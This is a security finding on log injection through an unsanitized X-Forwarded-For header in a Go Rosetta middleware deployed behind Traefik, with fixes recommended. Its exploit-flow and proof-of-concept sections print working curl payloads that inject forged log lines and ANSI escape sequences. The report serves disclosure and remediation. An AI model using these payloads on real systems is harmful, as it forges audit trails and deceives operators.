### Title
Log Injection via Unsanitized `X-Forwarded-For` Header in `getClientIpAddress()`

### Summary
`getClientIpAddress()` in `rosetta/app/middleware/trace.go` reads the `X-Forwarded-For` header verbatim and returns it with no validation or sanitization. The raw value is directly interpolated into a logrus log message via `fmt.Sprintf`. Because Traefik is deployed with `--entryPoints.web.forwardedHeaders.insecure`, any external client can supply an arbitrary `X-Forwarded-For` value — including newlines, ANSI escape sequences, and fake log fields — which are written to the log stream as-is.

### Finding Description
**Exact code path:**

`rosetta/app/middleware/trace.go`, `getClientIpAddress()` lines 63–74:
```go
func getClientIpAddress(r *http.Request) string {
    ipAddress := r.Header.Get(xRealIpHeader)
    if len(ipAddress) == 0 {
        ipAddress = r.Header.Get(xForwardedForHeader)   // ← raw, unsanitized
    }
    ...
    return ipAddress
}
```

`TracingMiddleware` lines 52–58 then does:
```go
message := fmt.Sprintf("%s %s %s (%d) in %s",
    clientIpAddress, ...)   // ← injected value lands here
log.Info(message)           // ← logrus writes it verbatim
```

**Root cause:** The function assumes the header contains a valid IP address string. There is no format check, no character allowlist, and no stripping of control characters or newlines before the value is embedded in the log line.

**Failed assumption:** The code assumes a trusted reverse proxy has already validated and replaced the `X-Forwarded-For` header. In practice, Traefik is configured with `--entryPoints.web.forwardedHeaders.insecure` (`charts/hedera-mirror-common/values.yaml` lines 643–645), which explicitly instructs Traefik to **trust and forward all `X-Forwarded-For` headers from all sources** without any IP allowlist. The client-supplied value reaches the Go handler unchanged.

**Exploit flow:**
1. Attacker sends a request with a crafted header, e.g.:
   ```
   X-Forwarded-For: 1.2.3.4\ntime="2024-01-01T00:00:00Z" level=info msg="10.0.0.1 POST /transactions (200) in 2ms"
   ```
2. Traefik passes it through unchanged (insecure mode).
3. `getClientIpAddress()` returns the multi-line string.
4. `fmt.Sprintf` embeds it; `log.Info` writes two lines to the log stream.
5. The second line is a fully attacker-controlled, structurally valid log entry.

For ANSI terminal injection, the payload is:
```
X-Forwarded-For: \x1b[2J\x1b[H\x1b[31m[CRITICAL] node compromised\x1b[0m
```
This clears the terminal and prints a fake critical alert when an operator tails the log.

### Impact Explanation
- **Log forgery:** An attacker can inject fake log entries that appear to originate from any IP address, for any endpoint, with any HTTP status code and timestamp. Audit tools or SIEM systems that reconstruct Rosetta transaction history from logs will ingest the forged entries, causing misattribution of requests (e.g., attributing a `/block` or `/construction/submit` call to a different IP or time).
- **Log reordering:** By injecting timestamps in the past or future, an attacker can cause log-based timeline reconstruction tools to place fabricated events at arbitrary positions in the transaction history.
- **Terminal escape injection:** Operators viewing live logs in a terminal are exposed to screen-clearing or color-manipulation payloads, potentially hiding real alerts.
- **Severity:** Medium–High. No direct fund theft, but the integrity of the audit trail for the Rosetta API (which is the primary interface for exchange integrations and block explorers) is compromised.

### Likelihood Explanation
- **No authentication required.** Any HTTP client reachable by the Traefik ingress can send the header.
- **Traefik `forwardedHeaders.insecure` is committed to the production Helm chart** (`charts/hedera-mirror-common/values.yaml` lines 643–645), making this the default deployed configuration.
- **Trivially repeatable** with a single `curl` command.
- The only precondition is network access to the Traefik ingress, which is the public-facing entry point.

### Recommendation
1. **Sanitize in `getClientIpAddress()`:** After reading the header, validate that the value matches an IP address (or comma-separated IP list) before returning it. Reject or truncate anything that does not match `^[\d.,: a-fA-F]+$`.
   ```go
   import "regexp"
   var ipPattern = regexp.MustCompile(`^[\d.a-fA-F:, ]+$`)
   
   func getClientIpAddress(r *http.Request) string {
       ipAddress := r.Header.Get(xRealIpHeader)
       if len(ipAddress) == 0 {
           ipAddress = r.Header.Get(xForwardedForHeader)
       }
       if !ipPattern.MatchString(ipAddress) {
           ipAddress = ""
       }
       ...
   }
   ```
2. **Strip control characters before logging:** Apply a sanitizer to `message` before passing it to logrus, removing `\n`, `\r`, and ANSI escape sequences (`\x1b[...`).
3. **Restrict Traefik trusted IPs:** Replace `forwardedHeaders.insecure` with `forwardedHeaders.trustedIPs` set to the known internal CIDR ranges, so only headers from trusted proxies are forwarded.

### Proof of Concept
```bash
# 1. Newline log injection — injects a fake transaction log entry
curl -H $'X-Forwarded-For: 1.2.3.4\ntime="2024-01-01T00:00:00Z" level=info msg="9.9.9.9 POST /construction/submit (200) in 1ms"' \
     http://<traefik-host>/network/list

# Expected result in server logs:
# time="..." level=info msg="1.2.3.4 GET /network/list (200) in Xms"
# time="2024-01-01T00:00:00Z" level=info msg="9.9.9.9 POST /construction/submit (200) in 1ms"
# The second line is entirely attacker-controlled.

# 2. ANSI terminal escape injection — clears operator terminal
curl -H $'X-Forwarded-For: \x1b[2J\x1b[H\x1b[31mCRITICAL: node key leaked\x1b[0m' \
     http://<traefik-host>/network/list
# When an operator runs `tail -f` on the log file in a terminal,
# the screen is cleared and the fake critical message is displayed.
```